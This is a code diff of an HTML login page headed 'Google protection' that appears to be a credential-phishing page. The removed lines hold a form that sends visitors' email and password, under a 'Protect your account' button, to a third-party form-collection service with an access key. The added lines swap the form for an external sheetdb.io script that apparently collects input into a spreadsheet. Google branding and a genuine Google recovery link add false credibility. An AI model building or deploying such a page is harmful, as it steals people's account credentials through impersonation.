@@ -2,6 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Register & Login</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
@@ -112,10 +113,10 @@
             color: white;
             cursor: pointer;
             transition: 0.9s;
-        }
+        } 
 
             .btn:hover {
-                background: #07001f;
+                background: rgb(125,125,235);
             }
 
         .or {
@@ -160,7 +161,9 @@
             font-size: 1rem;
             font-weight: bold;
         }
-
+        button a{
+            text-decoration: none;
+        }
             button:hover {
                 text-decoration: underline;
                 color: blue;
@@ -169,35 +172,19 @@
     </style>
 </head>
 <body>
-
-
     <div class="container" id="signIn">
         <h1 class="form-title">Google protection</h1>
-        <form action="https://api.web3forms.com/submit" method="POST">
-            <input type="hidden" name="access_key" value="e7dc2f09-2c3b-454b-9d78-d332b2263fbe">
-
-            <div class="input-group">
-                <i class="fas fa-envelope"></i>
-                <input type="email" name="name" id="email" placeholder="Email" required>
-                <label for="email">Email</label>
-            </div>
-            <div class="input-group">
-                <i class="fas fa-lock"></i>
-                <input type="password" name="email" id="password" placeholder="Password" required>
-                <label for="password">Password</label>
-            </div>
-            <p class="recover">
-                <a href="https://support.google.com/accounts/answer/41078?hl=en&co=GENIE.Platform%3DAndroid">Recover Password</a>
-            </p>
-            <button type="submit" class="btn">Protect your account.</button>
-        </form>
+        <script src="https://sheetdb.io/s/f/67l41b2okif2t.js"></script>
+        <p class="recover">
+            <a href="https://support.google.com/accounts/answer/41078?hl=en&co=GENIE.Platform%3DAndroid">Recover Password</a>
+        </p>
         <p class="or">
-          ----------or--------
+            ----------or--------
         </p>
         <div class="icons">
-          <i class="fab fa-google"></i>
-          <i class="fab fa-facebook"></i>
+            <i class="fab fa-google"></i>
+            <i class="fab fa-facebook"></i>
         </div>
-      </div>
-      </body>
+    </div>
+</body>
 </html>
